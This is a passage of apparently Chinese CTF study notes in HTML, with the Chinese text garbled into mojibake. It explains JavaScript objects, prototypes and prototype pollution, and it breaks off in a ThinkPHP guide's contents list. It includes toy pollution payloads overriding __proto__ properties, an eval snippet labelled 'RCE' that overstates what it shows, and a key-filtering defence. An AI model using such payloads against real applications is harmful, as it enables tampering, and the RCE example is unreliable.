href="#3-%E5%8E%9F%E5%9E%8B%E4%B8%8E%E7%BB%A7%E6%89%BF">3. åŸå‹ä¸ç»§æ‰¿</a></p><ul><li><a href="#31-__proto__-%E5%92%8C-%E5%8E%9F%E5%9E%8B%E9%93%BE">3.1 <code>__proto__</code> å’Œ åŸå‹é“¾</a></li><li><a href="#32-constructor">3.2 <code>constructor</code></a></li></ul></li><li><p><a href="#4-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93prototype-pollution">4. ç±»å‹æ±¡æŸ“ï¼ˆPrototype Pollutionï¼‰</a></p><ul><li><a href="#41-%E4%BB%80%E4%B9%88%E6%98%AF%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93">4.1 ä»€ä¹ˆæ˜¯ç±»å‹æ±¡æŸ“ï¼Ÿ</a></li><li><a href="#42-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93%E7%9A%84%E5%8E%9F%E7%90%86">4.2 ç±»å‹æ±¡æŸ“çš„åŸç†</a></li></ul></li><li><p><a href="#5-__proto__-%E5%92%8C-constructor-%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9">5. <code>__proto__</code> å’Œ <code>constructor</code> çš„å®‰å…¨é£é™©</a></p><ul><li><a href="#51-__proto__-%E6%B3%A8%E5%85%A5">5.1 <code>__proto__</code> æ³¨å…¥</a></li><li><a href="#52-constructor-%E5%92%8C-rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">5.2 <code>constructor</code> å’Œ RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</a></li><li><a href="#53-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">5.3 é˜²å¾¡æªæ–½</a></li></ul></li></ul><h3 id="1-JavaScriptä¸­çš„å¯¹è±¡"><a href="#1-JavaScriptä¸­çš„å¯¹è±¡" class="headerlink" title="1. JavaScriptä¸­çš„å¯¹è±¡"></a>1. JavaScriptä¸­çš„å¯¹è±¡</h3><h4 id="1-1-å¯¹è±¡åŸºæœ¬æ¦‚å¿µ"><a href="#1-1-å¯¹è±¡åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="1.1 å¯¹è±¡åŸºæœ¬æ¦‚å¿µ"></a>1.1 å¯¹è±¡åŸºæœ¬æ¦‚å¿µ</h4><p>JavaScriptä¸­çš„å¯¹è±¡æ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œç”¨äºå­˜å‚¨å¤æ‚çš„æ•°æ®ç»“æ„ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼åˆ›å»ºå¯¹è±¡ï¼š</p><ul><li><p><strong>å¯¹è±¡å­—é¢é‡</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">name</span>);  <span class="hljs-comment">// &quot;Alice&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="1-2-å¯¹è±¡çš„å±æ€§è®¿é—®"><a href="#1-2-å¯¹è±¡çš„å±æ€§è®¿é—®" class="headerlink" title="1.2 å¯¹è±¡çš„å±æ€§è®¿é—®"></a>1.2 å¯¹è±¡çš„å±æ€§è®¿é—®</h4><p>å¯ä»¥é€šè¿‡<strong>ç‚¹è®°æ³•</strong>æˆ–<strong>æ–¹æ‹¬å·è®°æ³•</strong>æ¥è®¿é—®å¯¹è±¡çš„å±æ€§ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);  <span class="hljs-comment">// ç‚¹è®°æ³•</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&quot;age&quot;</span>]);  <span class="hljs-comment">// æ–¹æ‹¬å·è®°æ³•</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-JavaScriptä¸­çš„å‡½æ•°"><a href="#2-JavaScriptä¸­çš„å‡½æ•°" class="headerlink" title="2. JavaScriptä¸­çš„å‡½æ•°"></a>2. JavaScriptä¸­çš„å‡½æ•°</h3><h4 id="2-1-å‡½æ•°å£°æ˜ä¸è¡¨è¾¾å¼"><a href="#2-1-å‡½æ•°å£°æ˜ä¸è¡¨è¾¾å¼" class="headerlink" title="2.1 å‡½æ•°å£°æ˜ä¸è¡¨è¾¾å¼"></a>2.1 å‡½æ•°å£°æ˜ä¸è¡¨è¾¾å¼</h4><p>JavaScriptä¸­çš„å‡½æ•°æ˜¯ç¬¬ä¸€ç±»å¯¹è±¡ï¼ˆFirst-Class Objectsï¼‰ï¼Œå¯ä»¥ä½œä¸ºå˜é‡çš„å€¼ã€å‚æ•°ä¼ é€’æˆ–è¿”å›å€¼ã€‚</p><ul><li><p><strong>å‡½æ•°å£°æ˜</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>å‡½æ•°è¡¨è¾¾å¼</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-2-ç®­å¤´å‡½æ•°"><a href="#2-2-ç®­å¤´å‡½æ•°" class="headerlink" title="2.2 ç®­å¤´å‡½æ•°"></a>2.2 ç®­å¤´å‡½æ•°</h4><p>ç®­å¤´å‡½æ•°æ˜¯ç®€åŒ–çš„å‡½æ•°å£°æ˜æ–¹å¼ï¼Œå°¤å…¶åœ¨å¤„ç†å›è°ƒå’Œç®€çŸ­å‡½æ•°æ—¶éå¸¸æœ‰ç”¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-3-this-å…³é”®å­—"><a href="#2-3-this-å…³é”®å­—" class="headerlink" title="2.3 this å…³é”®å­—"></a>2.3 <code>this</code> å…³é”®å­—</h4><p>åœ¨å‡½æ•°å†…éƒ¨ï¼Œ<code>this</code>æŒ‡å‘è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œ<code>this</code>æŒ‡å‘æ–°åˆ›å»ºçš„å®ä¾‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br>alice.<span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// &quot;Hello, I am Alice&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-åŸå‹ä¸ç»§æ‰¿"><a href="#3-åŸå‹ä¸ç»§æ‰¿" class="headerlink" title="3. åŸå‹ä¸ç»§æ‰¿"></a>3. åŸå‹ä¸ç»§æ‰¿</h3><p>JavaScriptä¸­çš„å¯¹è±¡æ˜¯é€šè¿‡åŸå‹é“¾è¿›è¡Œç»§æ‰¿çš„ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<strong>éšå¼åŸå‹</strong>ï¼ˆ<code>[[Prototype]]</code>ï¼‰ï¼Œå¯ä»¥é€šè¿‡<code>__proto__</code>å±æ€§æ¥è®¿é—®ã€‚</p><h4 id="3-1-proto-å’Œ-åŸå‹é“¾"><a href="#3-1-proto-å’Œ-åŸå‹é“¾" class="headerlink" title="3.1 __proto__ å’Œ åŸå‹é“¾"></a>3.1 <code>__proto__</code> å’Œ åŸå‹é“¾</h4><p><code>__proto__</code>æ˜¯JavaScriptä¸­å¯¹è±¡çš„åŸå‹ã€‚é€šè¿‡è¿™ä¸ªåŸå‹é“¾ï¼ŒJavaScriptèƒ½å¤Ÿåœ¨ä¸€ä¸ªå¯¹è±¡çš„ç¥–å…ˆé“¾ä¸­æŸ¥æ‰¾å±æ€§å’Œæ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;;<br><span class="hljs-keyword">let</span> obj2 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(obj);  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ªobjçš„å¯¹è±¡</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">key</span>);  <span class="hljs-comment">// è¾“å‡º &quot;value&quot;ï¼Œå› ä¸ºå®ƒç»§æ‰¿äº†objçš„å±æ€§</span><br></code></pre></td></tr></table></figure><p>å½“è®¿é—®<code>obj2</code>çš„<code>key</code>å±æ€§æ—¶ï¼ŒJavaScripté¦–å…ˆåœ¨<code>obj2</code>è‡ªèº«æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™æ²¿ç€åŸå‹é“¾æŸ¥æ‰¾<code>obj</code>çš„å±æ€§ã€‚</p><h4 id="3-2-constructor"><a href="#3-2-constructor" class="headerlink" title="3.2 constructor"></a>3.2 <code>constructor</code></h4><p><code>constructor</code>æ˜¯æ¯ä¸ªå¯¹è±¡çš„å±æ€§ï¼ŒæŒ‡å‘æ„é€ è¯¥å¯¹è±¡çš„å‡½æ•°ã€‚å¯ä»¥é€šè¿‡<code>constructor</code>åˆ›å»ºæ–°å®ä¾‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-ç±»å‹æ±¡æŸ“ï¼ˆPrototype-Pollutionï¼‰"><a href="#4-ç±»å‹æ±¡æŸ“ï¼ˆPrototype-Pollutionï¼‰" class="headerlink" title="4. ç±»å‹æ±¡æŸ“ï¼ˆPrototype Pollutionï¼‰"></a>4. ç±»å‹æ±¡æŸ“ï¼ˆPrototype Pollutionï¼‰</h3><h4 id="4-1-ä»€ä¹ˆæ˜¯ç±»å‹æ±¡æŸ“ï¼Ÿ"><a href="#4-1-ä»€ä¹ˆæ˜¯ç±»å‹æ±¡æŸ“ï¼Ÿ" class="headerlink" title="4.1 ä»€ä¹ˆæ˜¯ç±»å‹æ±¡æŸ“ï¼Ÿ"></a>4.1 ä»€ä¹ˆæ˜¯ç±»å‹æ±¡æŸ“ï¼Ÿ</h4><p>ç±»å‹æ±¡æŸ“ï¼ˆPrototype Pollutionï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ä¿®æ”¹å¯¹è±¡çš„åŸå‹ï¼ˆ<code>__proto__</code>ï¼‰æ¥ç¯¡æ”¹JavaScriptå…¨å±€å¯¹è±¡çš„è¡Œä¸ºï¼Œä»è€Œå½±å“æ‰€æœ‰ç»§æ‰¿è¯¥åŸå‹çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»å¯ä»¥å¯¼è‡´æƒé™æå‡ã€ä»£ç æ³¨å…¥ç­‰å®‰å…¨é—®é¢˜ã€‚</p><h4 id="4-2-ç±»å‹æ±¡æŸ“çš„åŸç†"><a href="#4-2-ç±»å‹æ±¡æŸ“çš„åŸç†" class="headerlink" title="4.2 ç±»å‹æ±¡æŸ“çš„åŸç†"></a>4.2 ç±»å‹æ±¡æŸ“çš„åŸç†</h4><p>å› ä¸ºæ‰€æœ‰å¯¹è±¡é€šè¿‡åŸå‹é“¾å…±äº«ç›¸åŒçš„åŸå‹ï¼Œå½“æ”»å‡»è€…ç¯¡æ”¹å…¨å±€å¯¹è±¡çš„<code>__proto__</code>æ—¶ï¼Œæ‰€æœ‰åŸºäºè¯¥åŸå‹åˆ›å»ºçš„å¯¹è±¡éƒ½ä¼šç»§æ‰¿è¢«ç¯¡æ”¹çš„å±æ€§æˆ–æ–¹æ³•ã€‚</p><p><strong>å±é™©æ“ä½œç¤ºä¾‹</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">polluted</span> = <span class="hljs-string">&quot;I am polluted!&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// &quot;I am polluted!&quot;</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šä¾‹ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡ä¿®æ”¹<code>obj</code>çš„åŸå‹ï¼ŒæˆåŠŸå°†æ–°çš„å±æ€§<code>polluted</code>æ³¨å…¥åˆ°äº†æ‰€æœ‰å¯¹è±¡çš„åŸå‹ä¸­ã€‚ç°åœ¨ï¼Œæ‰€æœ‰æ–°åˆ›å»ºçš„å¯¹è±¡éƒ½ä¼šå¸¦æœ‰è¿™ä¸ªâ€œæ±¡æŸ“â€çš„å±æ€§ã€‚</p><h4 id="4-3-é˜²å¾¡ç±»å‹æ±¡æŸ“"><a href="#4-3-é˜²å¾¡ç±»å‹æ±¡æŸ“" class="headerlink" title="4.3 é˜²å¾¡ç±»å‹æ±¡æŸ“"></a>4.3 é˜²å¾¡ç±»å‹æ±¡æŸ“</h4><p>ä¸ºäº†é˜²å¾¡ç±»å‹æ±¡æŸ“ï¼Œåº”è¯¥é¿å…å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®æˆ–ä¿®æ”¹<code>__proto__</code>ã€‚å¦‚æœå¯èƒ½ï¼Œå°½é‡ä½¿ç”¨<strong>æ·±æ‹·è´</strong>æˆ–è€…ä½¿ç”¨æ¡†æ¶ä¸­çš„å®‰å…¨åº“æ¥å¤„ç†å¯¹è±¡æ“ä½œã€‚</p><p><strong>é˜²å¾¡æ–¹æ³•</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// æ£€æŸ¥è¾“å…¥æ˜¯å¦æ˜¯ç›´æ¥çš„å¯¹è±¡å±æ€§</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeSet</span>(<span class="hljs-params">obj, key, value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (key !== <span class="hljs-string">&#x27;__proto__&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;constructor&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;prototype&#x27;</span>) &#123;<br>    obj[key] = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="5-proto-å’Œ-constructor-çš„å®‰å…¨é£é™©"><a href="#5-proto-å’Œ-constructor-çš„å®‰å…¨é£é™©" class="headerlink" title="5. __proto__ å’Œ constructor çš„å®‰å…¨é£é™©"></a>5. <code>__proto__</code> å’Œ <code>constructor</code> çš„å®‰å…¨é£é™©</h3><h4 id="5-1-proto-æ³¨å…¥"><a href="#5-1-proto-æ³¨å…¥" class="headerlink" title="5.1 __proto__ æ³¨å…¥"></a>5.1 <code>__proto__</code> æ³¨å…¥</h4><p>å½“ä¸å®‰å…¨åœ°æ“ä½œ<code>__proto__</code>æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç±»å‹æ±¡æŸ“æ¥å¼•å…¥æ¶æ„å±æ€§æˆ–æ–¹æ³•ï¼Œé€ æˆæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚</p><p><strong>ç¤ºä¾‹ï¼šåˆ©ç”¨<code>__proto__</code>ä¿®æ”¹å…¨å±€è¡Œä¸º</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is hacked!&quot;</span>;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-title function_">toString</span>());  <span class="hljs-comment">// &quot;This is hacked!&quot;</span><br></code></pre></td></tr></table></figure><h4 id="5-2-constructor-å’Œ-RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰"><a href="#5-2-constructor-å’Œ-RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="5.2 constructor å’Œ RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰"></a>5.2 <code>constructor</code> å’Œ RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</h4><p><code>constructor</code>ä¹Ÿæ˜¯ä¸€ä¸ªå®¹æ˜“è¢«æ»¥ç”¨çš„å¯¹è±¡å±æ€§ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶<code>constructor</code>ï¼Œå¯èƒ½ä¼šæ³¨å…¥æ¶æ„ä»£ç å¯¼è‡´RCEã€‚</p><p><strong>å±é™©æ“ä½œç¤ºä¾‹</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">constructor</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(&quot;RCE via constructor!&quot;)&#x27;</span>);<br>&#125;;<br><br><span class="hljs-keyword">let</span> x = <span class="hljs-keyword">new</span> obj.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>);  <span class="hljs-comment">// è§¦å‘æ¶æ„ä»£ç æ‰§è¡Œ</span><br></code></pre></td></tr></table></figure><h4 id="5-3-é˜²å¾¡æªæ–½"><a href="#5-3-é˜²å¾¡æªæ–½" class="headerlink" title="5.3 é˜²å¾¡æªæ–½"></a>5.3 é˜²å¾¡æªæ–½</h4><ul><li><strong>ä¸¥æ ¼é™åˆ¶ç”¨æˆ·è¾“å…¥</strong>: æ£€æŸ¥å’Œè¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œé˜²æ­¢ç›´æ¥æ“ä½œ<code>__proto__</code>æˆ–<code>constructor</code>ã€‚</li><li><strong>å†»ç»“å¯¹è±¡åŸå‹</strong>: ä½¿ç”¨<code>Object.freeze()</code>æˆ–<code>Object.seal()</code>æ¥é˜²æ­¢å¯¹è±¡çš„åŸå‹è¢«ä¿®æ”¹ã€‚<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br></code></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨å®‰å…¨çš„å¯¹è±¡æ“ä½œæ–¹æ³•</strong>: é¿å…ç›´æ¥ä½¿ç”¨<code>__proto__</code>ï¼Œæ”¹ç”¨<code>Object.create()</code>ç­‰å®‰å…¨çš„æ–¹å¼åˆ›å»ºå¯¹è±¡ã€‚</li></ul><hr><h3 id="6-æ€»ç»“"><a href="#6-æ€»ç»“" class="headerlink" title="6. æ€»ç»“"></a>6. æ€»ç»“</h3><p>JavaScriptä¸­çš„å¯¹è±¡ã€å‡½æ•°ã€<code>__proto__</code>ä¸<code>constructor</code>æœºåˆ¶åœ¨CTFå’ŒWebå®‰å…¨ä¸­æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚CTFé€‰æ‰‹åº”å½“ç†Ÿæ‚‰è¿™äº›æ¦‚å¿µï¼Œç‰¹åˆ«æ˜¯ç±»å‹æ±¡æŸ“ã€åŸå‹é“¾çš„æ”»å‡»ä¸é˜²å¾¡æŠ€å·§ï¼Œä»¥åº”å¯¹Webé¢˜ä¸­å¸¸è§çš„å®‰å…¨æŒ‘æˆ˜ã€‚</p><h4 id="å…³é”®ç‚¹å›é¡¾ï¼š"><a href="#å…³é”®ç‚¹å›é¡¾ï¼š" class="headerlink" title="å…³é”®ç‚¹å›é¡¾ï¼š"></a>å…³é”®ç‚¹å›é¡¾ï¼š</h4><ul><li><p>JavaScriptä¸­çš„å¯¹è±¡å’Œå‡½æ•°æ˜¯åŸºäºåŸå‹é“¾çš„ï¼Œè¿™ä¸ºç±»å‹æ±¡æŸ“æ”»å‡»æä¾›äº†å¯èƒ½ã€‚</p></li><li><p><code>__proto__</code>æ˜¯è®¿é—®å’Œä¿®æ”¹å¯¹è±¡åŸå‹çš„å…¥å£ï¼Œå®¹æ˜“è¢«æ»¥ç”¨ã€‚</p></li><li><p><code>constructor</code>ä¸ä»…ç”¨äºå¯¹è±¡æ„é€ ï¼Œè¿˜å¯èƒ½è¢«æ»¥ç”¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p></li><li><p>é˜²å¾¡ç±»å‹æ±¡æŸ“çš„å…³é”®åœ¨äºè¾“å…¥éªŒè¯ã€å†»ç»“åŸå‹ã€ä»¥åŠä½¿ç”¨å®‰å…¨çš„å¯¹è±¡æ“ä½œæ–¹æ³•ã€‚</p></li></ul><h1 id="3-PHP-æ¡†æ¶-ThinkPHP"><a href="#3-PHP-æ¡†æ¶-ThinkPHP" class="headerlink" title="3. PHP æ¡†æ¶ - ThinkPHP"></a><strong>3. PHP</strong> <strong>æ¡†æ¶ - ThinkPHP</strong></h1><h3 id="ThinkPHP-å¿«é€Ÿå…¥é—¨ä¸å®Œæ•´æŒ‡å—"><a href="#ThinkPHP-å¿«é€Ÿå…¥é—¨ä¸å®Œæ•´æŒ‡å—" class="headerlink" title="ThinkPHP å¿«é€Ÿå…¥é—¨ä¸å®Œæ•´æŒ‡å—"></a>ThinkPHP å¿«é€Ÿå…¥é—¨ä¸å®Œæ•´æŒ‡å—</h3><p>æœ¬æŒ‡å—å°†ä»é¡¹ç›®çš„ç›®å½•ç»“æ„å¼€å§‹ï¼Œæ¶µç›–ä»æ§åˆ¶å™¨ã€è·¯ç”±ã€æ•°æ®åº“æ“ä½œã€è§†å›¾æ¸²æŸ“ã€è¡¨å•éªŒè¯ã€é”™è¯¯å¤„ç†ã€æ—¥å¿—è®°å½•ç­‰å¸¸è§åŠŸèƒ½çš„ä½¿ç”¨ï¼Œæœ€åä¼šä»‹ç»é¡¹ç›®çš„éƒ¨ç½²ä¸é…ç½®ã€‚</p><hr><h3 id="ç›®å½•-2"><a href="#ç›®å½•-2" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ol><li><p><a href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">ç›®å½•ç»“æ„</a></p></li><li><p><a href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">å¿«é€Ÿå…¥é—¨</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%99%A8">åˆ›å»ºæ§åˆ¶å™¨</a></li><li><a href="#%E9%85%8D%E7%BD%AE%E8%B7%AF%E7%94%B1">é…ç½®è·¯ç”±</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C">æ•°æ®åº“æ“ä½œ</a></li></ul></li><li><p><a href="#%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93">é…ç½®æ•°æ®åº“</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%9E%8B">åˆ›å»ºæ¨¡å‹</a></li></ul></li><li><p><a href="#%E8%A7%86%E5%9B%BE%E5%92%8C%E6%A8%A1%E6%9D%BF">è§†å›¾å’Œæ¨¡æ¿</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E8%A7%86%E5%9B%BE%E6%96%87%E4%BB%B6">åˆ›å»ºè§†å›¾æ–‡ä»¶</a></li><li><a href="#%E6%B8%B2%E6%9F%93%E8%A7%86%E5%9B%BE">æ¸²æŸ“è§†å›¾</a></li></ul></li><li><p><a href="#%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">è¡¨å•éªŒè¯</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E9%AA%8C%E8%AF%81%E5%99%A8">åˆ›å»ºéªŒè¯å™¨</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E5%99%A8">ä½¿ç”¨éªŒè¯å™¨</a></li></ul></li><li><p><a href="#%E9%94%99%E8%AF%AF%E5%92%8C%E6%97%A5%E5%BF%97">é”™è¯¯å’Œæ—¥å¿—</a></p><ul><li><a href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">é”™è¯¯å¤„ç†</a></li><li><a 